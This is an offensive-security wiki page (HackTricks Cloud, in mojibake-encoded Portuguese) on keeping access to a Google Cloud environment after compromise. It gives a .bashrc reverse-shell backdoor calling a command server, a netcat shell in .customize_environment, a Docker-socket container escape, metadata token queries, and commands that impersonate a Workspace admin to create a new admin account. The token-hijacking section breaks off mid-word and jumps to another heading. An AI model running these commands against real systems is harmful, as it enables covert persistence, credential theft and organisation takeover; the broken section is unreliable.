# GCP - Persist√™ncia n√£o-svc

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **reposit√≥rios do github.**

</details>

Essas s√£o t√©cnicas √∫teis quando, de alguma forma, voc√™ comprometeu algumas credenciais GCP ou uma m√°quina em execu√ß√£o em um ambiente GCP.

## Google‚Äôs Cloud Shell <a href="#e5eb" id="e5eb"></a>

### Backdoor Persistente

O [**Google Cloud Shell**](https://cloud.google.com/shell/) fornece acesso √† linha de comando aos seus recursos em nuvem diretamente do seu navegador sem nenhum custo associado.

Voc√™ pode acessar o Cloud Shell do Google a partir do **console da web** ou executando **`gcloud cloud-shell ssh`**.

Essa console tem algumas capacidades interessantes para atacantes:

1. **Qualquer usu√°rio do Google com acesso ao Google Cloud** tem acesso a uma inst√¢ncia do Cloud Shell totalmente autenticada.
2. Essa inst√¢ncia **manter√° seu diret√≥rio home por pelo menos 120 dias** se nenhuma atividade ocorrer.
3. N√£o h√° **capacidades para uma organiza√ß√£o monitorar** a atividade dessa inst√¢ncia.

Isso basicamente significa que um atacante pode colocar uma backdoor no diret√≥rio home do usu√°rio e, desde que o usu√°rio se conecte ao GC Shell a cada 120 dias pelo menos, a backdoor sobreviver√° e o atacante obter√° um shell sempre que for executado apenas fazendo:

```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```

H√° outro arquivo na pasta home chamado **`.customize_environment`** que, se existir, ser√° **executado toda vez** que o usu√°rio acessar o **cloud shell** (como na t√©cnica anterior). Basta inserir a backdoor anterior ou uma como a seguinte para manter a persist√™ncia enquanto o usu√°rio usa "frequentemente" o cloud shell:

```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```

{% hint style="warning" %}
Observe que a **primeira vez que uma a√ß√£o √© executada no Cloud Shell que requer autentica√ß√£o**, ele **aparece** uma janela de autoriza√ß√£o no navegador do usu√°rio que deve ser aceita antes que o comando seja executado. Se uma janela pop-up inesperada aparecer, o alvo pode ficar suspeito e queimar o m√©todo de persist√™ncia.
{% endhint %}

### Escape de Container do Google Cloud Shell

Observe que o Google Cloud Shell √© executado dentro de um cont√™iner, voc√™ pode **escapar facilmente para o host** fazendo:

```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```

Isso n√£o √© considerado uma vulnerabilidade pelo Google, mas d√° uma vis√£o mais ampla do que est√° acontecendo nesse ambiente.

Al√©m disso, observe que a partir do host, voc√™ pode encontrar um token de conta de servi√ßo:

```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```

Com os seguintes escopos:

```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```

## Sequestro de Token

### Usu√°rio Autenticado

Se voc√™ conseguir acessar a pasta home de um **usu√°rio autenticado no GCP**, por **padr√£o**, voc√™ poder√° **obter tokens para esse usu√°rio enquanto quiser** sem precisar autenticar e independentemente da m√°quina que voc√™ use seus tokens e mesmo se o usu√°rio tiver MFA configurado.

Is
## Espalhando para o Workspace via delega√ß√£o de autoridade em todo o dom√≠nio <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com) √© a plataforma de colabora√ß√£o e produtividade do Google, que consiste em coisas como Gmail, Google Calendar, Google Drive, Google Docs, etc.

As **contas de servi√ßo** no GCP podem receber os **direitos de acesso program√°tico aos dados do usu√°rio** no Workspace, por meio da representa√ß√£o de usu√°rios leg√≠timos. Isso √© conhecido como [delega√ß√£o em todo o dom√≠nio](https://developers.google.com/admin-sdk/reports/v1/guides/delegation). Isso inclui a√ß√µes como **ler** **e-mails** no GMail, acessar o Google Docs e at√© criar novas contas de usu√°rio na organiza√ß√£o G Suite.

O Workspace tem [sua pr√≥pria API](https://developers.google.com/gsuite/aspects/apis), completamente separada do GCP. As permiss√µes s√£o concedidas ao Workspace e **n√£o h√° nenhuma rela√ß√£o padr√£o entre o GCP e o Workspace**.

No entanto, √© poss√≠vel **dar** a uma conta de servi√ßo **permiss√µes** sobre um usu√°rio do Workspace. Se voc√™ tiver acesso √† interface da Web neste ponto, poder√° navegar at√© **IAM -> Contas de servi√ßo** e ver se alguma das contas tem **"Habilitado" listado na coluna "delega√ß√£o em todo o dom√≠nio"**. A coluna em si pode **n√£o aparecer se nenhuma conta estiver habilitada** (voc√™ pode ler os detalhes de cada conta de servi√ßo para confirmar isso). No momento em que este texto foi escrito, n√£o h√° como fazer isso programaticamente, embora haja uma [solicita√ß√£o para essa funcionalidade](https://issuetracker.google.com/issues/116182848) no rastreador de bugs do Google.

Para criar essa rela√ß√£o, √© necess√°rio **ativ√°-la no GCP e tamb√©m no Workforce**.

#### Testando o acesso ao Workspace

Para testar esse acesso, voc√™ precisar√° das **credenciais da conta de servi√ßo exportadas em formato JSON**. Voc√™ pode ter adquirido essas informa√ß√µes em uma etapa anterior ou pode ter o acesso necess√°rio agora para criar uma chave para uma conta de servi√ßo que voc√™ sabe ter a delega√ß√£o em todo o dom√≠nio habilitada.

Este t√≥pico √© um pouco complicado... sua conta de servi√ßo tem algo chamado "client\_email", que voc√™ pode ver no arquivo de credenciais JSON que exportou. Provavelmente parece algo como `account-name@project-name.iam.gserviceaccount.com`. Se voc√™ tentar acessar chamadas da API do Workforce diretamente com esse e-mail da conta, mesmo com a delega√ß√£o habilitada, voc√™ falhar√°. Isso ocorre porque o diret√≥rio do Workforce n√£o incluir√° os endere√ßos de e-mail das contas de servi√ßo do GCP. Em vez disso, para interagir com o Workforce, precisamos realmente representar usu√°rios v√°lidos do Workforce.

O que voc√™ realmente quer fazer √© **representar um usu√°rio com acesso administrativo** e, em seguida, usar esse acesso para fazer algo como **redefinir uma senha, desativar a autentica√ß√£o multifator ou apenas criar uma nova conta de administrador**.

O Gitlab criou [este script Python](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py) que pode fazer duas coisas - listar o diret√≥rio do usu√°rio e criar uma nova conta administrativa. Aqui est√° como voc√™ usaria:

```bash
# Validar apenas o acesso
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com

# Listar o diret√≥rio
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --list

# Criar uma nova conta de administrador
./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --account pwned
```

Voc√™ pode experimentar este script em uma variedade de endere√ßos de e-mail para representar **v√°rios usu√°rios**. A sa√≠da padr√£o indicar√° se a conta de servi√ßo tem acesso ao Workforce e incluir√° uma **senha aleat√≥ria para a nova conta de administrador** se uma for criada.

Se voc√™ tiver sucesso na cria√ß√£o de uma nova conta de administrador, poder√° fazer login no [console de administra√ß√£o do Google](https://admin.google.com) e ter controle total sobre tudo no G Suite para cada usu√°rio - e-mail, documentos, calend√°rio, etc. Divirta-se.

## Refer√™ncias

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>